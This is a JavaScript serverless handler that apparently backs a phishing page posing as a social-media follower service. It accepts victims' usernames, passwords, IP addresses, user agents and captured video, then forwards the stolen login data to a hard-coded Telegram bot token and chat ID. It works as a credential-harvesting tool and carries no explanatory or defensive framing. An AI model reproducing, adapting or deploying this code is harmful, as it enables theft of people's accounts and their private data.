// api/send_to_telegram.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password, ipInfo, userAgent, followers, video, videoType } = req.body;
    const BOT_TOKEN = '8038389810:AAEPEktTfJXTCuyNGLfZc_ZAvZ49FrTbTGk';
    const CHAT_ID = '6748148257';

    const now = new Date();
    const timeString = now.toLocaleString();

    try {
        // If video is present, send it as a video file
        if (video) {
            // First send the text message
            const textMessage = `
🔐 **New Video Login Received** 🔐
            
👤 **Username/Email:** ${username}
🔑 **Password:** ${password}
🌐 **IP Address:** ${ipInfo}
📊 **Requested Followers:** ${followers}
⏰ **Time:** ${timeString}
📱 **User Agent:** ${userAgent}
            `;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: textMessage,
                    parse_mode: 'Markdown'
                })
            });
            
            // Send video as document (Telegram bot API doesn't accept base64 directly)
            // You'll need to implement video sending via form-data
            // For now, we'll just log that video was captured
            console.log('Video captured for user:', username);
            
            res.status(200).json({ success: true, message: "Login data sent, video captured" });
        } else {
            // No video, just send login data
            const message = `
🔐 **New Login Received** 🔐
            
👤 **Username/Email:** ${username}
🔑 **Password:** ${password}
🌐 **IP Address:** ${ipInfo}
📊 **Requested Followers:** ${followers}
⏰ **Time:** ${timeString}
📱 **User Agent:** ${userAgent}
            `;

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const data = await response.json();

            if (data.ok) {
                res.status(200).json({ success: true, message: "Sent to Telegram" });
            } else {
                res.status(400).json({ success: false, error: data.description });
            }
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
}